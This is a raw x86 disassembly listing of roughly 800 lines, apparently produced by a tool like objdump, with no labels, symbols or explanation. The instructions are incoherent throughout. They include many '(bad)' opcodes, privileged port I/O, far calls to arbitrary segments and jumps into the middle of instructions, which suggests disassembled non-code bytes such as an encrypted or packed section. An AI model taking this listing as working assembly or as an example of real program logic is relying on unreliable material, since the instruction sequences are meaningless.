  405cb7:	pushf  
  405cb8:	cmp    bl,BYTE PTR [edx]
  405cba:	dec    edi
  405cbb:	and    cl,bh
  405cbd:	mov    al,ds:0x4abfb033
  405cc2:	imul   edi,DWORD PTR [esp+edx*2+0x13],0xffffff84
  405cc7:	inc    eax
  405cc8:	in     eax,dx
  405cc9:	xor    eax,0xa1197e03
  405cce:	lods   al,BYTE PTR ds:[esi]
  405ccf:	lea    eax,[ebp+0x1d]
  405cd2:	jl     0x405d04
  405cd4:	or     DWORD PTR [eax+edi*1],ecx
  405cd7:	cmp    DWORD PTR [ecx],0xffffffdb
  405cda:	xchg   esp,eax
  405cdb:	(bad)  
  405cdd:	inc    esp
  405cde:	repz xchg esp,eax
  405ce0:	mov    esi,0xaed9df7d
  405ce5:	xor    DWORD PTR [eax+0x69],esp
  405ce8:	fdiv   QWORD PTR [eax-0x55]
  405ceb:	push   ss
  405cec:	loopne 0x405cf1
  405cee:	xchg   ebp,eax
  405cef:	push   ss
  405cf0:	fcom   st(5)
  405cf2:	nop
  405cf3:	rol    BYTE PTR [ebp-0x56],1
  405cf6:	pop    edi
  405cf7:	loope  0x405cea
  405cf9:	add    edi,DWORD PTR [ebx+0x2bbbbb29]
  405cff:	(bad)  
  405d00:	add    al,0x25
  405d02:	lahf   
  405d03:	push   0x10
  405d05:	js     0x405d38
  405d07:	cld    
  405d08:	mov    db4,ebx
  405d0b:	jecxz  0x405d16
  405d0d:	or     BYTE PTR [edx+0x3ce14c9],cl
  405d13:	lock sub eax,0x5242bd10
  405d19:	test   DWORD PTR [esi+ebx*1+0x184e3568],ecx
  405d20:	cmp    ch,dh
  405d22:	sub    DWORD PTR [edx],esi
  405d24:	mov    ebp,0x292c665c
  405d29:	inc    esp
  405d2a:	dec    esi
  405d2b:	js     0x405d18
  405d2d:	idiv   BYTE PTR ds:0xb12331d9
  405d33:	sbb    al,BYTE PTR [ecx+0x5130b542]
  405d39:	call   0xeca8:0x6e6889b9
  405d40:	das    
  405d41:	push   esi
  405d42:	adc    DWORD PTR [ecx],edi
  405d44:	push   edi
  405d45:	adc    al,0xd0
  405d47:	daa    
  405d48:	stc    
  405d49:	mov    edi,0xfa04ac73
  405d4e:	call   0x7a27fae7
  405d53:	mov    dh,0xe5
  405d55:	inc    edx
  405d56:	test   eax,0x600acad1
  405d5b:	out    dx,al
  405d5c:	dec    ebx
  405d5d:	mul    BYTE PTR ds:0x907914b2
  405d63:	sbb    DWORD PTR [edi-0x4c61a5a8],ebp
  405d69:	mov    bl,0x78
  405d6b:	adc    DWORD PTR [edi],edi
  405d6d:	cmp    DWORD PTR [eax],ebx
  405d6f:	pop    esi
  405d70:	outs   dx,DWORD PTR ds:[esi]
  405d71:	jmp    0x405d0a
  405d73:	pushf  
  405d74:	jp     0x405d2d
  405d76:	arpl   WORD PTR [edx+0x18bdf70b],cx
  405d7c:	add    BYTE PTR [esi+eiz*8+0x6979bc01],ch
  405d83:	fimul  WORD PTR [ebp+0x62]
  405d86:	aaa    
  405d87:	jmp    0x405d57
  405d89:	shr    esi,cl
  405d8b:	pop    ds
  405d8c:	sub    ecx,DWORD PTR ds:0x27338f05
  405d92:	lods   eax,DWORD PTR ds:[esi]
  405d93:	push   edi
  405d94:	das    
  405d95:	test   cl,bl
  405d97:	push   ebx
  405d98:	mov    esi,0x93ec8ea9
  405d9d:	xchg   esi,eax
  405d9e:	sub    cl,al
  405da0:	mov    al,ds:0x7e110e94
  405da5:	or     al,0x2e
  405da7:	push   edi
  405da8:	addr16 into 
  405daa:	out    0xb4,al
  405dac:	mov    ch,0xa1
  405dae:	inc    ebx
  405daf:	in     eax,dx
  405db0:	scas   al,BYTE PTR es:[edi]
  405db1:	test   BYTE PTR [eax-0x55],dh
  405db4:	in     eax,0x2b
  405db6:	add    eax,ecx
  405db8:	loope  0x405e27
  405dba:	outs   dx,DWORD PTR ds:[esi]
  405dbb:	ret    
  405dbc:	dec    ebp
  405dbd:	and    ebx,DWORD PTR [edx+0x7c]
  405dc0:	jge    0x405e0f
  405dc2:	xchg   ecx,eax
  405dc3:	ret    0xe49c
  405dc6:	(bad)  
  405dc7:	or     al,0x21
  405dc9:	inc    esp
  405dca:	add    BYTE PTR [eax+esi*4+0x79],al
  405dce:	mov    bl,0x41
  405dd0:	ret    
  405dd1:	xchg   dh,dh
  405dd3:	adc    BYTE PTR [ecx],0x19
  405dd6:	fadd   DWORD PTR [esi-0x55]
  405dd9:	daa    
  405dda:	ret    
  405ddb:	mov    ebx,DWORD PTR es:[eax-0x2c]
  405ddf:	imul   eax,DWORD PTR ds:0x337bf0f2,0xc6534127
  405de9:	push   es
  405dea:	ss out 0x80,al
  405ded:	lock inc edi
  405def:	imul   esp,ebp,0xffffffd7
  405df2:	xor    BYTE PTR ds:0xedb6091,0xab
  405df9:	gs scas ax,WORD PTR es:[edi]
  405dfc:	xchg   edi,eax
  405dfd:	stos   DWORD PTR es:[edi],eax
  405dfe:	icebp  
  405dff:	mov    eax,0xe6509e72
  405e04:	call   0xe510c66a
  405e09:	push   ebp
  405e0a:	ins    DWORD PTR es:[edi],dx
  405e0b:	pop    edx
  405e0c:	cli    
  405e0d:	pop    ecx
  405e0e:	ret    0x3426
  405e11:	leave  
  405e12:	sub    ecx,DWORD PTR [edi-0x579a76b3]
  405e18:	out    dx,eax
  405e19:	mov    dx,0x3986
  405e1d:	cmc    
  405e1e:	jb     0x405dc0
  405e20:	scas   eax,DWORD PTR es:[edi]
  405e21:	aam    0x5
  405e23:	xchg   ebx,eax
  405e24:	icebp  
  405e25:	sub    al,0x31
  405e27:	pop    ds
  405e28:	mov    ds:0x1464441,al
  405e2d:	xor    ebp,edx
  405e2f:	push   eax
  405e30:	push   esp
  405e31:	push   ebx
  405e32:	call   0x9b1a:0x74298ee3
  405e39:	das    
  405e3a:	adc    DWORD PTR [eax],ebx
  405e3c:	cdq    
  405e3d:	push   edx
  405e3e:	popf   
  405e3f:	ins    DWORD PTR es:[edi],dx
  405e40:	fdivrp st(3),st
  405e42:	dec    ebp
  405e43:	xchg   edi,eax
  405e44:	scas   eax,DWORD PTR es:[edi]
  405e45:	and    edx,eax
  405e47:	dec    ecx
  405e48:	int3   
  405e49:	add    cl,dl
  405e4b:	cmp    DWORD PTR [ebp+0x39276f7e],esi
  405e51:	xlat   BYTE PTR ds:[ebx]
  405e52:	push   es
  405e53:	shl    BYTE PTR [ecx+0xc7d0a6],1
  405e59:	dec    ebx
  405e5a:	cld    
  405e5b:	loope  0x405edb
  405e5d:	data16 es fwait
  405e60:	inc    ecx
  405e61:	mov    esp,0x684a6859
  405e66:	cmp    BYTE PTR [ecx],dl
  405e68:	(bad)  
  405e69:	sti    
  405e6a:	jge    0x405e91
  405e6c:	push   ds
  405e6d:	pop    ecx
  405e6e:	in     eax,dx
  405e6f:	push   ecx
  405e70:	fnstcw WORD PTR [ebp+0x6634fb49]
  405e76:	add    DWORD PTR [ebp-0x6e],0xa1233c0c
  405e7d:	jg     0x405e5f
  405e7f:	stos   BYTE PTR es:[edi],al
  405e80:	xchg   ebp,eax
  405e81:	mov    cl,cl
  405e83:	sbb    ebp,DWORD PTR [eax+ebx*4+0x4352a8c8]
  405e8a:	sbb    DWORD PTR [eax+0x462541d],esi
  405e90:	or     eax,0x8187cdc0
  405e95:	mov    edx,0x3d78588e
  405e9a:	and    bl,bl
  405e9c:	push   cs
  405e9d:	xchg   ebx,eax
  405e9e:	xchg   edx,eax
  405e9f:	aas    
  405ea0:	daa    
  405ea1:	into   
  405ea2:	(bad)  ds:0x70ca0be0
  405ea8:	loopne 0x405e5d
  405eaa:	or     esp,esp
  405eac:	push   0xffffffbb
  405eae:	and    DWORD PTR [eax-0x1],esp
  405eb1:	jecxz  0x405e7e
  405eb3:	cmp    edi,DWORD PTR [esi]
  405eb5:	out    0x69,eax
  405eb7:	fwait
  405eb8:	in     al,0xbb
  405eba:	dec    ecx
  405ebb:	icebp  
  405ebc:	and    dl,0x5a
  405ebf:	iret   
  405ec0:	icebp  
  405ec1:	or     BYTE PTR [esi+0x6c],ch
  405ec4:	(bad)  
  405ec5:	xor    DWORD PTR [eax+0x71b7b6d5],ecx
  405ecb:	jl     0x405f17
  405ecd:	ror    DWORD PTR [esi],0x60
  405ed0:	dec    ebx
  405ed1:	addr16 icebp 
  405ed3:	gs jg  0x405ec6
  405ed6:	add    BYTE PTR [ebx-0x6f],al
  405ed9:	cmp    esp,0x87db9b71
  405edf:	xor    cl,dh
  405ee1:	sbb    DWORD PTR [ecx+0x59],ebp
  405ee4:	xor    eax,0xd464d612
  405ee9:	add    al,0x98
  405eeb:	loopne 0x405ef5
  405eed:	sub    DWORD PTR [ecx-0x54632acd],ecx
  405ef3:	stos   DWORD PTR es:[edi],eax
  405ef4:	sub    edx,DWORD PTR [ecx]
  405ef6:	mov    ebx,0x7cb92269
  405efb:	fld    st(7)
  405efd:	arpl   WORD PTR [edi],si
  405eff:	jne    0x405f2d
  405f01:	jo     0x405eb8
  405f03:	jle    0x405f61
  405f05:	inc    edi
  405f06:	outs   dx,BYTE PTR ds:[esi]
  405f07:	mov    ds:0xcc51d70,al
  405f0c:	ds mov DWORD PTR ds:[esi],esi
  405f10:	pop    edx
  405f11:	inc    ecx
  405f12:	fwait
  405f13:	mov    ebp,0xf8dacd03
  405f18:	pop    ecx
  405f19:	mov    ah,0xd
  405f1b:	out    0xe4,al
  405f1d:	loop   0x405ebb
  405f1f:	jne    0x405ea3
  405f21:	jbe    0x405f4f
  405f23:	pop    esp
  405f24:	dec    ecx
  405f25:	test   eax,0xb4a98ec0
  405f2a:	daa    
  405f2b:	xlat   BYTE PTR ds:[ebx]
  405f2c:	adc    DWORD PTR [esp+edi*4-0x670dbafd],edi
  405f33:	push   ecx
  405f34:	xchg   ecx,eax
  405f35:	mov    eax,ds:0xa4e6fdd0
  405f3a:	add    al,0xc9
  405f3c:	push   ss
  405f3d:	mov    eax,ds:0xebd4a69f
  405f42:	ret    0x8a11
  405f45:	jno    0x405f8f
  405f47:	ins    BYTE PTR es:[edi],dx
  405f48:	mov    bh,0x80
  405f4a:	(bad)  
  405f4c:	mov    eax,ds:0x7a80b00b
  405f51:	pop    ecx
  405f52:	or     dl,BYTE PTR [edi+0x48]
  405f55:	into   
  405f56:	sub    DWORD PTR [edx+0x1e],ecx
  405f59:	int    0x5c
  405f5b:	jmp    0xa02dd734
  405f60:	icebp  
  405f61:	inc    eax
  405f62:	sbb    esi,0xa83bbc85
  405f68:	inc    eax
  405f69:	int    0x8a
  405f6b:	or     al,0xb5
  405f6d:	xchg   edx,eax
  405f6e:	jle    0x405fb7
  405f70:	push   es
  405f71:	int    0xf4
  405f73:	xor    ch,BYTE PTR [eax+0x1699695c]
  405f79:	cld    
  405f7a:	xchg   edi,eax
  405f7b:	loopne 0x405fbd
  405f7d:	jmp    0x405f9e
  405f7f:	aam    0x40
  405f81:	jb     0x405f25
  405f83:	adc    bh,BYTE PTR [edx]
  405f85:	in     al,0xdf
  405f87:	aas    
  405f88:	jno    0x405f27
  405f8a:	xchg   esi,eax
  405f8b:	inc    edi
  405f8c:	jnp    0x405f84
  405f8e:	xchg   BYTE PTR [edi-0x36],al
  405f91:	in     al,0x48
  405f93:	les    esp,FWORD PTR [esi+0x15]
  405f96:	retf   0x7bf4
  405f99:	jmp    0x179d:0xdf06a070
  405fa0:	adc    ecx,DWORD PTR [esi+0x32]
  405fa3:	ficomp DWORD PTR [esi+0x3938ce5e]
  405fa9:	xlat   BYTE PTR ds:[ebx]
  405faa:	shl    DWORD PTR [edi+0x3a],0x7
  405fae:	dec    edi
  405faf:	stc    
  405fb0:	fmul   DWORD PTR [ebp+0x4a2d7b24]
  405fb6:	jg     0x405fd5
  405fb8:	xlat   BYTE PTR ds:[ebx]
  405fb9:	ja     0x406004
  405fbb:	cmp    al,0x90
  405fbd:	fisub  WORD PTR [ebx-0x53720bb4]
  405fc3:	push   cs
  405fc4:	lods   al,BYTE PTR ds:[esi]
  405fc5:	jno    0x405fe3
  405fc7:	inc    eax
  405fc8:	mov    eax,0xcffd3189
  405fcd:	ret    0x7dc0
  405fd0:	xor    BYTE PTR [ecx-0x823634c],0x8d
  405fd7:	pop    ebx
  405fd8:	out    dx,eax
  405fd9:	loope  0x405f70
  405fdb:	imul   edi,DWORD PTR [esi],0xad6a3a02
  405fe1:	pop    edx
  405fe2:	ficomp DWORD PTR [edx-0x46d448d]
  405fe8:	jbe    0x405f86
  405fea:	mov    al,ds:0x37584307
  405fef:	inc    ebp
  405ff0:	scas   eax,DWORD PTR es:[edi]
  405ff1:	xchg   ebx,eax
  405ff2:	fdiv   QWORD PTR [esp+edi*4-0x7c012930]
  405ff9:	jmp    0x568b37e6
  405ffe:	xor    DWORD PTR [ecx],0x680753da
  406004:	cmp    ch,BYTE PTR ds:0xde13d28b
  40600a:	push   esp
  40600b:	mov    BYTE PTR [ecx-0x7c],0x12
  40600f:	fisub  DWORD PTR [esi+0x2a]
  406012:	imul   ecx,ebp,0x469cc766
  406018:	mov    bh,0x97
  40601a:	pushf  
  40601b:	retfw  
  40601d:	dec    edi
  40601e:	xor    BYTE PTR [ecx-0x5b7f7ee2],dh
  406024:	int    0x23
  406026:	adc    ebx,0x26
  406029:	jmp    0xb8e3:0xb71c8c7d
  406030:	fdivp  st(3),st
  406032:	push   ecx
  406033:	inc    edx
  406034:	sub    al,0x6e
  406036:	ins    BYTE PTR es:[edi],dx
  406037:	xchg   ebp,eax
  406038:	sbb    eax,0x869e6822
  40603d:	mov    esp,0x7b8b51e7
  406042:	mov    DWORD PTR [ebx+0x44],esi
  406045:	cmp    al,0x9f
  406047:	iret   
  406048:	cs enter 0x7188,0x8c
  40604d:	enter  0x2e04,0x5c
  406051:	push   edx
  406052:	xchg   esi,ebp
  406054:	cmp    BYTE PTR [eax+ebx*4-0x75],dl
  406058:	adc    edx,edx
  40605a:	pop    esi
  40605b:	xchg   esi,eax
  40605c:	pop    esi
  40605d:	out    dx,eax
  40605e:	rcr    DWORD PTR [ecx],cl
  406060:	push   esi
  406061:	int    0x6c
  406063:	hlt    
  406064:	lock out 0x4,eax
  406067:	lock xor eax,0x71327826
  40606d:	xchg   ebx,eax
  40606f:	stc    
  406070:	fucomip st,st(6)
  406072:	ja     0x406014
  406074:	jge    0x4060c2
  406076:	dec    ebp
  406077:	push   eax
  406078:	(bad)  
  406079:	xchg   ecx,eax
  40607a:	or     bl,ch
  40607c:	cdq    
  40607d:	adc    eax,0x2454cf7d
  406082:	into   
  406083:	xor    BYTE PTR [edx],cl
  406085:	dec    edi
  406086:	fmul   QWORD PTR [esi-0x7e4cb3]
  40608c:	lea    edx,[ebp+0x72996da2]
  406092:	inc    ecx
  406093:	inc    esp
  406094:	aam    0xc7
  406096:	in     al,dx
  406097:	and    cl,BYTE PTR [esi]
  406099:	mov    edi,0x6e2419ad
  40609e:	add    esi,ecx
  4060a0:	mov    esi,edx
  4060a2:	jnp    0x406028
  4060a4:	out    dx,eax
  4060a5:	inc    ebx
  4060a6:	cmp    eax,DWORD PTR [ebx+edi*8+0x5e]
  4060aa:	push   edi
  4060ab:	inc    edi
  4060ac:	pop    ebx
  4060ad:	sub    al,0xbf
  4060af:	push   esi
  4060b0:	loop   0x4060d4
  4060b2:	icebp  
  4060b3:	mov    ebp,DWORD PTR [edi-0x4]
  4060b6:	fs mov esi,0x35b90bff
  4060bc:	adc    edi,DWORD PTR [ecx+0x41]
  4060bf:	mov    eax,0x99f8e706
  4060c4:	cmp    ebx,DWORD PTR [ebx+ebx*1-0x59118e55]
  4060cb:	fwait
  4060cc:	or     al,0x50
  4060ce:	sbb    esp,eax
  4060d0:	push   0x2a1519c
  4060d5:	dec    ebp
  4060d6:	ds pop ecx
  4060d8:	pop    edi
  4060d9:	dec    ebx
  4060da:	mov    dh,0x18
  4060dc:	mov    BYTE PTR [ebp-0x79cf3312],al
  4060e2:	pop    edi
  4060e3:	sub    BYTE PTR [ecx+0x42125454],dl
  4060e9:	fwait
  4060ea:	mov    ebp,0xcb227385
  4060ef:	cld    
  4060f0:	or     BYTE PTR [edx+esi*2-0x2a],0xcc
  4060f5:	daa    
  4060f6:	test   al,0xf0
  4060f8:	retf   0x6d19
  4060fb:	(bad)  
  4060fc:	xor    ebx,ebp
  4060fe:	jge    0x406152
  406100:	(bad)  [edi]
  406102:	mov    edx,0x1c8e13fd
  406107:	arpl   WORD PTR [ebx-0x4cf18dcf],dx
  40610d:	push   es
  40610e:	or     edx,DWORD PTR [ebp+0x79]
  406111:	dec    esi
  406112:	fldcw  WORD PTR [ebp+0x9]
  406115:	adc    DWORD PTR [ecx-0x67],esi
  406118:	repnz add DWORD PTR [edi+0x31],ebp
  40611c:	lahf   
  40611d:	test   eax,0x2d197374
  406122:	pop    esi
  406123:	mov    esp,0x7b18d31
  406128:	es shl edi,1
  40612b:	cmc    
  40612c:	mov    BYTE PTR [esp+edi*4],dl
  40612f:	sub    ch,BYTE PTR [ebx+0x59]
  406132:	add    BYTE PTR [edi+0x61],dl
  406135:	mov    ebx,0x4410922
  40613a:	cmc    
  40613b:	xchg   DWORD PTR [ebx-0x4b8c9540],edi
  406141:	mov    edx,0xcc5077eb
  406146:	nop
  406147:	and    cl,bh
  406149:	in     eax,dx
  40614a:	js     0x40615c
  40614c:	(bad)  
  40614e:	pop    esp
  40614f:	cmp    esi,DWORD PTR [ecx+0x43]
  406152:	pop    ds
  406153:	or     ah,BYTE PTR [esi+ebx*8]
  406156:	and    BYTE PTR [eax],0x27
  406159:	sub    eax,0x40563b75
  40615e:	inc    ecx
  40615f:	push   edx
  406160:	push   edx
  406161:	inc    esi
  406162:	adc    al,BYTE PTR [edx-0x58]
  406165:	dec    edi
  406166:	std    
  406167:	ret    
  406168:	mov    ebx,0x37ca5441
  40616d:	fdiv   QWORD PTR [ecx+eax*8]
  406170:	xor    cl,BYTE PTR [ebp+0x38338c88]
  406176:	inc    esp
  406177:	add    esi,DWORD PTR [edx+ebx*1+0x2e]
  40617b:	dec    eax
  40617c:	sar    BYTE PTR [edx+0x7a],cl
  40617f:	out    dx,eax
  406180:	cld    
  406181:	sbb    DWORD PTR [eax],0x3ff46fce
  406187:	add    eax,0x1abf9f95
  40618c:	out    dx,al
  40618d:	mov    ecx,0x40ef3925
  406192:	iret   
  406193:	sub    BYTE PTR gs:[edi],bh
  406196:	scas   eax,DWORD PTR es:[edi]
  406197:	pusha  
  406198:	cmp    DWORD PTR ds:0x470f6ee9,ebx
  40619e:	push   ss
  40619f:	dec    ebx
  4061a0:	ins    BYTE PTR es:[edi],dx
  4061a1:	stos   BYTE PTR es:[edi],al
  4061a2:	sub    ebp,esi
  4061a4:	dec    edx
  4061a5:	xor    BYTE PTR [eax],ch
  4061a7:	out    0xf3,eax
  4061a9:	aam    0x1d
  4061ab:	dec    ecx
  4061ac:	data16 cmp ah,ah
  4061af:	ror    BYTE PTR [edx+0x8],cl
  4061b2:	sbb    al,0x70
  4061b4:	or     eax,0xb444d66c
  4061b9:	xor    bl,BYTE PTR [eax+0x3f658c7]
  4061bf:	dec    edi
  4061c0:	jp     0x4061b9
  4061c2:	adc    BYTE PTR [eax-0x21],cl
  4061c5:	faddp  st(7),st
  4061c7:	ret    0xc3f5
  4061ca:	rol    BYTE PTR [edi],0x86
  4061cd:	push   edi
  4061ce:	xchg   esp,eax
  4061cf:	xchg   ebx,eax
  4061d0:	jmp    0x4061e4
  4061d2:	imul   ecx,DWORD PTR [eax+0x4dc072cd],0x58
  4061d9:	mov    eax,ds:0x9bb71c3c
  4061de:	or     ebx,edi
  4061e0:	outs   dx,DWORD PTR ds:[esi]
  4061e1:	dec    ebp
  4061e2:	jns    0x40618e
  4061e4:	arpl   WORD PTR [edx+0xc],bp
  4061e7:	push   es
  4061e8:	jae    0x40621b
  4061ea:	dec    ebp
  4061eb:	or     al,BYTE PTR [eax+ecx*4]
  4061ee:	mov    bl,0x31
  4061f0:	pop    ss
  4061f1:	xchg   ebp,eax
  4061f2:	jecxz  0x406189
  4061f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061f5:	adc    edx,esi
  4061f7:	cld    
  4061f8:	retf   
  4061f9:	stos   DWORD PTR es:[edi],eax
  4061fa:	jae    0x406264
  4061fc:	shl    BYTE PTR [ebp-0x76],1
  4061ff:	pop    ds
  406200:	jg     0x4061a1
  406202:	push   ds
  406203:	pop    ds
  406204:	or     edx,esi
  406206:	into   
  406207:	jne    0x406232
  406209:	jne    0x4061e6
  40620b:	in     eax,dx
  40620c:	xlat   BYTE PTR ds:[ebx]
  40620d:	pop    ss
  40620e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40620f:	sub    DWORD PTR [eax+0x2501851e],edi
  406215:	sub    BYTE PTR [esi+0x54],bl
  406218:	and    bh,cl
  40621a:	mov    al,0xf1
  40621c:	outs   dx,BYTE PTR ds:[esi]
  40621d:	hlt    
  40621e:	rcr    BYTE PTR [esi],0x2f
  406221:	test   DWORD PTR [ebx],ebx
  406223:	and    DWORD PTR [esi+0x3d56f0e7],ecx
  406229:	scas   eax,DWORD PTR es:[edi]
  40622a:	pop    edx
  40622b:	cld    
  40622c:	push   ebp
  40622d:	push   es
  40622e:	jle    0x406224
  406230:	std    
  406231:	push   eax
  406232:	lock xchg esp,eax
  406234:	loopne 0x4061e4
  406236:	add    BYTE PTR ds:0x76bc27b5,ch
  40623c:	push   0x57
  40623e:	test   al,0x12
  406240:	xchg   esp,eax
  406241:	dec    esp
  406242:	fst    DWORD PTR [esi+0x10]
  406245:	push   eax
  406246:	loope  0x406247
  406248:	fwait
  406249:	or     al,0xdc
  40624b:	cdq    
  40624c:	pop    ebx
  40624d:	arpl   WORD PTR [esi+0x48b14556],cx
  406253:	call   0x8cc9:0xb755a9ce
  40625a:	stos   BYTE PTR es:[edi],al
  40625b:	cwde   
  40625c:	call   0x7df643e1
  406261:	xor    cl,dl
  406263:	inc    edx
  406264:	cmp    esp,ebp
  406266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406267:	mov    esp,0x46e913b3
  40626c:	mov    eax,DWORD PTR [ecx+esi*2-0x4c]
  406270:	pop    ecx
  406271:	test   DWORD PTR [eax],edi
  406273:	fimul  WORD PTR [edx-0x71]
  406276:	mov    ebx,0x771aa93e
  40627b:	aaa    
  40627c:	jnp    0x4062a2
  40627e:	popa   
  40627f:	mov    ds:0xf09955db,eax
  406284:	cli    
  406285:	and    al,0x2f
  406287:	loope  0x406230
  406289:	hlt    
  40628a:	loope  0x4062a3
  40628c:	push   0xe56c9916
  406291:	mov    ah,0x1d
  406293:	push   ss
  406294:	hlt    
  406295:	push   ebp
  406296:	leave  
  406297:	jne    0x406242
  406299:	add    DWORD PTR [ecx-0x12],0x74
  40629d:	or     ch,BYTE PTR [edx]
  40629f:	xchg   ebp,eax
  4062a0:	enter  0xdac3,0x92
  4062a4:	mov    al,ds:0xc2890c9c
  4062a9:	ss mov al,0x15
  4062ac:	add    dh,cl
  4062ae:	call   0x59d703c0
  4062b3:	cwde   
  4062b4:	adc    eax,0xb8c1dd09
  4062b9:	cdq    
  4062ba:	xchg   ebp,eax
  4062bb:	push   esp
  4062bc:	out    dx,eax
  4062bd:	jecxz  0x40625a
  4062bf:	mov    WORD PTR [edx-0x368d4431],cs
  4062c5:	mov    ds:0x144120d8,al
  4062ca:	pop    eax
  4062cb:	push   ecx
  4062cc:	cld    
  4062cd:	push   0xcaa21c0a
  4062d2:	arpl   bp,bx
  4062d4:	mov    WORD PTR [ebx+0x3779109d],es
  4062da:	inc    esp
  4062db:	sub    esi,DWORD PTR [eax+0x7c8288a0]
  4062e1:	cwde   
  4062e2:	das    
  4062e3:	dec    edx
  4062e4:	sub    DWORD PTR [ebx+eiz*2-0xc4289ec],eax
  4062eb:	sub    eax,0x5650e177
  4062f0:	ror    DWORD PTR [ebp+0xc6db051],cl
  4062f6:	mov    dh,0xe
  4062f8:	pop    esi
  4062f9:	les    ecx,FWORD PTR [ebx+0x6c]
  4062fc:	es add esi,0xffffffa7
  406300:	rcr    BYTE PTR [ebx+0x3f],cl
  406303:	add    BYTE PTR [edi+0x1f8700e6],0xb6
  40630a:	lods   al,BYTE PTR ds:[esi]
  40630b:	dec    eax
  40630c:	mov    cl,0x21
  40630e:	add    DWORD PTR [eax],0xc95c46af
  406314:	stc    
  406315:	scas   al,BYTE PTR es:[edi]
  406316:	paddusw mm3,mm0
  406319:	test   al,0x5f
  40631b:	xor    DWORD PTR [edx+0x45],ecx
  40631e:	stc    
  40631f:	clc    
  406320:	inc    ecx
  406321:	jbe    0x406381
  406323:	mov    esi,0x7862cce3
  406328:	pusha  
  406329:	push   ebp
  40632a:	or     BYTE PTR [edx-0x6f],dl
  40632d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40632f:	adc    bl,bl
  406331:	in     al,dx
  406332:	outs   dx,BYTE PTR ds:[esi]
  406333:	add    cl,bh
  406335:	mov    ecx,0x2c0b91f7
  40633a:	fdiv   QWORD PTR [ebx]
  40633c:	fild   WORD PTR [edx+0x6da563bf]
  406342:	sar    BYTE PTR [esp+ecx*4+0x56],0x11
  406347:	or     DWORD PTR [ecx-0xd],ecx
  40634a:	psrad  mm2,QWORD PTR [ecx]
  40634d:	push   0x2daed40d
  406352:	mov    DWORD PTR [edi+eax*4],esp
  406355:	ja     0x4063d6
  406357:	loopne 0x4063b3
  406359:	xchg   edx,eax
  40635a:	fld    QWORD PTR [esi+0x47e8f08c]
  406360:	fldenv [esi-0x4bd7e02c]
  406366:	leave  
  406367:	(bad)  
  406368:	cmp    BYTE PTR gs:[edi],dh
  40636b:	fisttp QWORD PTR [esi+eiz*1+0x50531b2]
  406372:	ror    DWORD PTR [ebx+eiz*1+0x49],cl
  406376:	rcl    DWORD PTR [esi-0x16661dea],0x88
  40637d:	xchg   ebx,eax
  40637e:	out    0x95,al
  406380:	push   ebp
  406381:	sbb    ebp,DWORD PTR fs:[eax]
  406384:	cmc    
  406385:	dec    edx
  406386:	call   0x1d22c309
  40638b:	dec    edx
  40638c:	sub    esp,esp
  40638e:	in     eax,0xd5
  406390:	sub    esi,0xa01cd58c
  406396:	and    bl,BYTE PTR ds:0x8ffe9378
  40639c:	sti    
  40639d:	loope  0x4063d2
  40639f:	inc    ebx
  4063a0:	sub    eax,0x86849bb8
  4063a5:	popf   
  4063a6:	mov    ecx,0x1d1704bd
  4063ab:	jb     0x406364
  4063ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ae:	inc    esi
  4063af:	mov    ecx,0x7123753e
  4063b4:	imul   esi,edi,0x333efbbb
  4063ba:	ret    
  4063bb:	outs   dx,BYTE PTR ds:[esi]
  4063bc:	repz in eax,0x6c
  4063bf:	(bad)  
  4063c1:	pop    esp
  4063c2:	jb     0x406439
  4063c4:	add    edi,DWORD PTR [esi+0x1924d74c]
  4063ca:	in     al,0xf6
  4063cc:	das    
  4063cd:	test   eax,0x9f98ac83
  4063d2:	aad    0x2b
  4063d4:	fdiv   DWORD PTR [ecx-0x1ed2b5cf]
  4063da:	lds    eax,FWORD PTR [ecx+eax*4+0x20bccaf2]
  4063e1:	dec    edx
  4063e2:	mov    ebp,0xe971f688
  4063e7:	xor    BYTE PTR [esi-0x4ef12f2b],al
  4063ed:	leave  
  4063ee:	or     BYTE PTR [ebx-0x35],bh
  4063f1:	sbb    eax,0x5b865fc8
  4063f6:	pcmpeqw mm7,mm6
  4063f9:	push   0x60187aeb
  4063fe:	je     0x4063c2
  406400:	pushf  
  406401:	out    0x36,eax
  406403:	sub    ecx,0xffffffbe
  406406:	dec    esi
  406407:	xchg   BYTE PTR [ecx+0x7a5fef2c],ch
  40640d:	ins    DWORD PTR es:[edi],dx
  40640e:	mov    ecx,edi
  406410:	or     al,0xb5
  406412:	stos   DWORD PTR es:[edi],eax
  406413:	jns    0x4063d0
  406415:	(bad)  
  406416:	iret   
  406417:	pop    es
  406418:	fisttp QWORD PTR [edx-0x13]
  40641b:	and    al,0xc
  40641d:	mov    esp,0xd02beba6
  406422:	xor    al,0xbb
  406424:	popa   
  406425:	and    ebx,ebx
  406427:	frstor [ecx-0x2b5fa92e]
  40642d:	pop    ebx
  40642e:	jns    0x4063be
  406430:	or     esp,DWORD PTR [edi+0x62dbc04d]
  406436:	lods   eax,DWORD PTR ds:[esi]
  406437:	ins    BYTE PTR es:[edi],dx
  406438:	ret    0x2940
  40643b:	pop    edi
  40643c:	pop    ds
  40643d:	ret    0x103
  406440:	cmp    al,0x8
  406442:	iret   
  406443:	shl    BYTE PTR [esi],1
  406445:	mov    bl,0x9
  406447:	add    ch,BYTE PTR [edi]
  406449:	stos   DWORD PTR es:[edi],eax
  40644a:	mov    cl,0x86
  40644c:	call   0x1bb8:0xb0248b45
  406453:	out    dx,eax
  406454:	adc    DWORD PTR [edi-0x3f4528c9],edx
  40645a:	loop   0x406409
  40645c:	pusha  
  40645d:	int    0xfc
  40645f:	xchg   BYTE PTR [edi+0x50],dl
  406462:	mov    ecx,0x70db69c1
  406467:	and    al,0x73
  406469:	fst    st(1)
  40646b:	(bad)  
  40646c:	mov    ebp,DWORD PTR [ebp+0x2509e5ff]
  406472:	push   ss
  406473:	cmc    
  406474:	les    ecx,FWORD PTR [eax-0x32088997]
  40647a:	shl    DWORD PTR [ecx],cl
  40647c:	mov    esi,0x16adb036
  406481:	repnz nop
  406483:	push   edi
  406484:	push   0xc8b593cd
  406489:	imul   edi,DWORD PTR [ebp*8+0x19b1cc57],0x58
  406491:	outs   dx,BYTE PTR ds:[esi]
  406492:	jnp    0x4064ab
  406494:	lock pop eax
  406496:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
